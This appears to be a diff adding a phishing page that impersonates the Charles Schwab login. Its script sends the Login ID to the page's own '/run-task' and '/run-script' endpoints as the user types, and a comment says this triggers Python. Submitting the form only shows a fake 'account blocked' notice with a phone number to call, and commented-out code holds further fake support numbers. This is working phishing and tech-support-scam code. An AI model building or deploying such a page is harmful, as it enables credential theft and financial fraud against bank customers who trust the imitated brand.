@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Centered Login Page</title>
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+
+    .main-container {
+      min-height: calc(100vh - 50px);
+      background: url("https://content.schwab.com/web/login/login-background-hq.png") center/cover no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 1rem;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .logo img {
+      width: 64px;
+      height: auto;
+      margin-bottom: 1rem;
+    }
+    
+
+    .login-container h3 {
+      font-size: 1.25rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .login-desc {
+      font-size: 0.9rem;
+      color: #5b616e;
+      margin-bottom: 1rem;
+    }
+
+   .error-message {
+  color: #721c24;                    /* dark red text */
+  background-color: #f8d7da;         /* light red background (Bootstrap-like) */
+  border: 1px solid #f5c6cb;         /* subtle border */
+  border-radius: 4px;
+  padding: 0.75rem 1rem;
+  font-size: 0.95rem;
+  margin-bottom: 1rem;
+  text-align: left;
+  display: none;
+}
+
+.highlight-number {
+  font-weight: bold;
+  color: #c82333;                    /* slightly darker red for emphasis */
+}
+
+
+    .btn-primary {
+      background-color: #007bff;
+      border: none;
+    }
+
+    .btn-primary:hover {
+      background-color: #0056b3;
+    }
+
+    .links {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+    }
+
+    .links a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 50px;
+      font-size: 0.9rem;
+    }
+
+    .phone-img {
+      width: 20px;
+      margin-right: 8px;
+    }
+
+    @media (max-width: 500px) {
+      .login-container {
+        margin: 1rem;
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- <div class="error-message" id="error-message">
+        Your account access has been blocked due to suspicious activities. Contact our customer service at  +1-818-856-2723 to verify and unlock your account.
+      </div> -->
+  <div class="main-container">
+    <div class="login-container">
+      <div class="logo">
+        <img src="https://i.ibb.co/5ZpRKF9/Whats-App-Image-2025-08-11-at-5-14-28-PM.jpg" alt="Logo">
+      </div>
+      <h3 class="mt-2">Log in to Schwab</h3>
+      <p class="login-desc">Not your device? Use a private or incognito window to sign in.</p>
+     <div class="error-message" id="error-message">
+  Your account access has been blocked due to suspicious activities.
+  Contact our customer service at <span class="highlight-number">(812)-484-9509</span> to verify and unlock your account.
+</div>
+
+      <form id="loginForm">
+        <div class=" text-start">
+          <label for="loginId" class="form-label">Login ID</label>
+          <input type="text" id="userid" class="form-control" id="loginId" />
+          <!-- <p id="result"></p> -->
+        </div>
+        <div class=" text-start">
+          <label for="password" class="form-label">Password</label>
+          <input type="password" class="form-control" id="password" />
+        </div>
+        <div class="form-check text-start ">
+          <input type="checkbox" class="form-check-input" id="rememberId" />
+          <label class="form-check-label" for="rememberId">Remember Login ID</label>
+        </div>
+        <div class=" text-start">
+          <label for="startPage" class="form-label">Start Page</label>
+          <select class="form-select" id="startPage">
+            <option>Accounts Summary</option>
+            <option>Account Balances</option>
+            <option>Positions</option>
+            <option>Trade Ticket</option>
+            <option>History</option>
+            <option>Stock & ETF Trading</option>
+            <option>Options Trading</option>
+            <option>Mutual Fund Trading</option>
+            <option>Bond Trading</option>
+            <option>Research</option>
+            <option>Order Status</option>
+            <option>Watchlist</option>
+          </select>
+        </div>
+        <button type="submit" class="btn btn-primary w-100 mt-2">Log In</button>
+      </form>
+      <div class="links mt-2">
+        <a href="#">Sign in to a business account</a> | 
+        <a href="#">Privacy Policy</a>
+      </div>
+    </div>
+  </div>
+  <div>
+      <img
+        src="https://i.postimg.cc/Wp89dG4F/Screenshot-from-2025-07-14-18-55-02.png"
+      /><i class="bi bi-telephone-fill me-2"></i>
+
+    </div>
+  <!-- <div class="footer">
+     <img class="phone-img" src="https://webdigiuxd.online/about-us/img/phone.png" alt="Phone" />
+     <i class="bi bi-telephone-fill me-2"></i>
+
+    Support +1 (844) 533-4817
+  </div> -->
+
+  <!-- <script>
+    const loginForm = document.getElementById("loginForm");
+    const errorMessage = document.getElementById("error-message");
+
+    loginForm.addEventListener("submit", (event) => {
+      event.preventDefault();
+      errorMessage.style.display = "block";
+    });
+  </script> -->
+  <script>
+    const input = document.getElementById("userid");
+    const result = document.getElementById("result");
+
+    input.addEventListener("input", async function () {
+      const val = input.value.trim();
+
+      // only send when 2 or more characters
+      if (val.length >= 2) {
+        const res = await fetch("/run-task", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ user_id: val })
+        });
+
+        const data = await res.json();
+        result.textContent = data.message;
+      }
+    });
+  </script>
+  <script>
+    // Show your existing error message on submit (unchanged)
+    
+    const loginForm = document.getElementById("loginForm");
+    const errorMessage = document.getElementById("error-message");
+    loginForm.addEventListener("submit", (event) => {
+      event.preventDefault();
+      errorMessage.style.display = "block";
+    });
+
+    // NEW: Trigger Python after the user enters 2+ chars
+    const loginId = document.getElementById("loginId");
+    let triggered = false;
+
+    loginId.addEventListener("input", () => {
+      if (!triggered && loginId.value.length >= 2) {
+        triggered = true;
+
+        fetch("/run-script", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ loginId: loginId.value })
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log("run-script response:", data);
+        })
+        .catch(err => console.error("run-script error:", err));
+      }
+
+      // Optional: if the user deletes back to <2 chars, allow retrigger
+      if (loginId.value.length < 2) {
+        triggered = false;
+      }
+    });
+  </script>
+</body>
+</html>
